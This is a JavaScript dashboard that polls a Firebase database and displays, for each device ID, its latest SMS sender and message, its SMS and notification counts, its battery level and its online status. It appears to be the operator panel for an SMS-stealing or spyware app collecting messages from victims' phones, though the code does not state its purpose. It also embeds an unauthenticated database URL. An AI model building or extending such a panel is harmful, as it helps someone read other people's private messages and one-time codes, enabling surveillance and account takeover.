// Configuration - YOUR FIREBASE URL
const API_BASE = 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app';
const USERS_URL = `${API_BASE}/users.json?shallow=true`;

let allUsers = [];
let refreshInterval = null;

// Fetch all user IDs
async function fetchUserIds() {
    try {
        const response = await fetch(USERS_URL);
        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
        const data = await response.json();
        return Object.keys(data);
    } catch (error) {
        console.error('Error fetching user IDs:', error);
        return [];
    }
}

// Fetch data for a single user
async function fetchUserData(userId) {
    try {
        const url = `${API_BASE}/users/${userId}.json`;
        const response = await fetch(url);
        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
        return await response.json();
    } catch (error) {
        console.error(`Error fetching user ${userId}:`, error);
        return null;
    }
}

// Parse timestamp
function parseTimestamp(timestamp) {
    if (!timestamp) return 'N/A';
    if (typeof timestamp === 'number') {
        return new Date(timestamp).toLocaleString();
    }
    if (typeof timestamp === 'string') {
        const date = new Date(timestamp);
        if (!isNaN(date.getTime())) {
            return date.toLocaleString();
        }
        return timestamp;
    }
    return String(timestamp);
}

// Check if user is online
function isUserOnline(userData) {
    if (userData && userData.status) {
        return userData.status.isOnline === true;
    }
    return false;
}

// Get last seen
function getLastSeen(userData) {
    if (userData && userData.status && userData.status.lastSeen) {
        return parseTimestamp(userData.status.lastSeen);
    }
    return 'N/A';
}

// Get SMS count
function getSmsCount(userData) {
    if (userData && userData.sms_logs) {
        return Object.keys(userData.sms_logs).length;
    }
    return 0;
}

// Get latest SMS
function getLatestSms(userData) {
    if (userData && userData.sms_logs) {
        const smsEntries = Object.entries(userData.sms_logs);
        if (smsEntries.length === 0) return null;
        smsEntries.sort((a, b) => {
            const tsA = a[1].timestamp || 0;
            const tsB = b[1].timestamp || 0;
            return tsB - tsA;
        });
        return smsEntries[0][1];
    }
    return null;
}

// Get notifications count
function getNotificationsCount(userData) {
    if (userData && userData.notifications) {
        return Object.keys(userData.notifications).length;
    }
    return 0;
}

// Escape HTML
function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Render a user card
function renderUserCard(userId, userData) {
    const online = isUserOnline(userData);
    const smsCount = getSmsCount(userData);
    const latestSms = getLatestSms(userData);
    const lastSeen = getLastSeen(userData);
    const notifCount = getNotificationsCount(userData);
    const battery = userData?.status?.battery ?? 'N/A';

    const card = document.createElement('div');
    card.className = 'user-card';
    card.id = `user-${userId}`;

    let smsHtml = '<div class="sms-section"><h4>📨 Latest SMS</h4>';
    if (latestSms) {
        smsHtml += `
            <div class="sms-item">
                <div class="sms-sender">${escapeHtml(latestSms.sender || 'Unknown')}</div>
                <div class="sms-message">${escapeHtml(latestSms.message || 'No message')}</div>
                <div class="sms-timestamp">${parseTimestamp(latestSms.timestamp)}</div>
            </div>
        `;
    } else {
        smsHtml += `<div class="no-sms">No SMS logs</div>`;
    }
    smsHtml += `</div>`;

    card.innerHTML = `
        <div class="user-header">
            <span class="user-id">📱 ${userId.substring(0, 8)}...</span>
            <span class="online-status ${online ? 'status-online' : 'status-offline'}">
                ${online ? '🟢 Online' : '⚫ Offline'}
            </span>
        </div>
        <div style="display:flex; gap:16px; flex-wrap:wrap; margin-bottom:12px; font-size:14px; color:#4a5568;">
            <span>🔋 ${battery}%</span>
            <span>📨 ${smsCount} SMS</span>
            <span>🔔 ${notifCount} Notifications</span>
            <span>⏰ ${lastSeen}</span>
        </div>
        ${smsHtml}
    `;

    return card;
}

// Update statistics
function updateStats(usersData) {
    const total = Object.keys(usersData).length;
    let online = 0;
    let totalSms = 0;

    for (const userId in usersData) {
        if (isUserOnline(usersData[userId])) online++;
        totalSms += getSmsCount(usersData[userId]);
    }

    document.getElementById('totalUsers').textContent = total;
    document.getElementById('onlineUsers').textContent = online;
    document.getElementById('newSms').textContent = totalSms;
}

// Main function to fetch all data
async function fetchAllData() {
    const refreshBtn = document.getElementById('refreshBtn');
    const loadingIndicator = document.getElementById('loadingIndicator');
    const userGrid = document.getElementById('userGrid');
    
    refreshBtn.disabled = true;
    loadingIndicator.style.display = 'block';
    userGrid.innerHTML = '';

    try {
        const userIds = await fetchUserIds();
        
        if (userIds.length === 0) {
            userGrid.innerHTML = '<div class="loading"><p>No users found in database.</p></div>';
            return;
        }

        const fetchPromises = userIds.map(userId => fetchUserData(userId));
        const usersDataArray = await Promise.all(fetchPromises);

        const usersData = {};
        userIds.forEach((userId, index) => {
            if (usersDataArray[index]) {
                usersData[userId] = usersDataArray[index];
            }
        });

        const fragment = document.createDocumentFragment();
        for (const userId in usersData) {
            const card = renderUserCard(userId, usersData[userId]);
            fragment.appendChild(card);
        }
        userGrid.appendChild(fragment);

        updateStats(usersData);
        document.getElementById('lastUpdate').textContent = `Last update: ${new Date().toLocaleString()}`;
        allUsers = usersData;

    } catch (error) {
        console.error('Error:', error);
        userGrid.innerHTML = `
            <div class="loading">
                <p>❌ Error loading data: ${error.message}</p>
                <button onclick="fetchAllData()" style="margin-top:16px; padding:8px 20px; background:#667eea; color:white; border:none; border-radius:8px; cursor:pointer;">Retry</button>
            </div>
        `;
    } finally {
        refreshBtn.disabled = false;
        loadingIndicator.style.display = 'none';
    }
}

// Auto-refresh every 30 seconds
function startAutoRefresh() {
    if (refreshInterval) {
        clearInterval(refreshInterval);
    }
    refreshInterval = setInterval(fetchAllData, 30000);
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    fetchAllData();
    startAutoRefresh();

    window.addEventListener('beforeunload', () => {
        if (refreshInterval) {
            clearInterval(refreshInterval);
        }
    });
});

window.fetchAllData = fetchAllData;